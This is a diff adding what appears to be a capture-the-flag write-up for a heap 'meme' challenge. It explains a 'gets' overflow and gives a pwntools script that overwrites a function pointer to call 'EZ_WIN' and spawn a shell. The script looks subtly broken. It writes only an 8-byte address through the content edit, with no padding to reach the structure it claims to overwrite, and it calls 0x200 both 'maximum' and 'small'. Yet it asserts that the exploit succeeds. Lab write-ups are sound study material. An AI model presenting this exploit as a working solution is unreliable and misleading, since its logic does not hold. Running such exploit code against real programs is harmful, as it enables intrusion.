@@ -1,0 +1,88 @@
+To solve this challenge using `pwntools`, we need to identify the vulnerabilities and craft an exploit accordingly. The key functions to focus on are `new_meme`, `edit_meme`, and `print_meme`. The vulnerability lies in the use of `gets` in the `edit_meme` function, which can lead to a buffer overflow.
+
+### Step-by-Step Solution
+
+1. **Identify the Vulnerability**:
+   - The `edit_meme` function uses `gets` to read input, which does not limit the number of bytes read. This can overwrite adjacent memory, leading to a buffer overflow.
+   - The `print_meme` function calls the function pointer stored in the meme structure, which can be overwritten to point to the `EZ_WIN` function.
+
+2. **Understand the Memory Layout**:
+   - Each meme is allocated 8 bytes for the function pointer and another 8 bytes for the content pointer.
+   - The content pointer points to the actual meme content, which is allocated based on the user-provided size.
+
+3. **Craft the Exploit**:
+   - Create a meme with a small size.
+   - Overwrite the function pointer in the meme structure to point to the `EZ_WIN` function.
+   - Trigger the `print_meme` function to call the `EZ_WIN` function.
+
+### Code Implementation
+
+Here is the Python code using `pwntools` to solve the challenge:
+
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './int'
+elf = context.binary = ELF(binary_path)
+p = process(binary_path)
+
+# Offsets and addresses
+meme_size = 0x200  # Maximum allowed size for meme content
+meme_index = 0     # Index of the meme to be edited
+ez_win_addr = elf.symbols['EZ_WIN']
+
+# Function to create a new meme
+def new_meme(size, content):
+    p.sendlineafter('Choice: ', '1')
+    p.sendlineafter('Enter meme size: ', str(size))
+    p.sendlineafter('Enter meme content: ', content)
+
+# Function to edit a meme
+def edit_meme(index, content):
+    p.sendlineafter('Choice: ', '2')
+    p.sendlineafter('Index: ', str(index))
+    p.sendlineafter('Enter meme content: ', content)
+
+# Function to print a meme
+def print_meme(index):
+    p.sendlineafter('Choice: ', '3')
+    p.sendlineafter('Index: ', str(index))
+
+# Create a new meme with a small size
+new_meme(meme_size, 'A' * 8)
+
+# Overwrite the function pointer in the meme structure to point to EZ_WIN
+payload = p64(ez_win_addr)
+edit_meme(meme_index, payload)
+
+# Trigger the print_meme function to call EZ_WIN
+print_meme(meme_index)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation
+
+1. **Set Up the Process**:
+   - Load the binary and start the process using `pwntools`.
+
+2. **Define Offsets and Addresses**:
+   - Define the maximum allowed size for the meme content.
+   - Define the index of the meme to be edited.
+   - Get the address of the `EZ_WIN` function from the binary.
+
+3. **Create a New Meme**:
+   - Use the `new_meme` function to create a new meme with a small size and some placeholder content.
+
+4. **Edit the Meme**:
+   - Use the `edit_meme` function to overwrite the function pointer in the meme structure with the address of the `EZ_WIN` function.
+
+5. **Print the Meme**:
+   - Use the `print_meme` function to trigger the call to the `EZ_WIN` function, which will give us a shell.
+
+6. **Interact with the Shell**:
+   - Use `p.interactive()` to interact with the shell spawned by the `EZ_WIN` function.
+
+This should successfully exploit the vulnerability and give you a shell.
